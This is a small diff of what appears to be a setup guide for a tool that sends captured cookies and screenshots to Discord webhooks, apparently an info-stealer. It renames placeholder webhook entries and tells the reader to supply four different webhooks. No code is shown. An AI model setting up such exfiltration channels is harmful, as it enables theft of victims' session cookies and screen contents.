@@ -8,8 +8,8 @@
 
 Change the :
 ```
-COOKIE_WEBHOOK_URLS = ["1", "1_test"]
-SCREENSHOT_WEBHOOK_URLS = ["2", "2_test"]
+COOKIE_WEBHOOK_URLS = ["1", "1_backup"]
+SCREENSHOT_WEBHOOK_URLS = ["2", "2_backup"]
 ```
 By 4 **DIFFERENT** discord webhooks
 
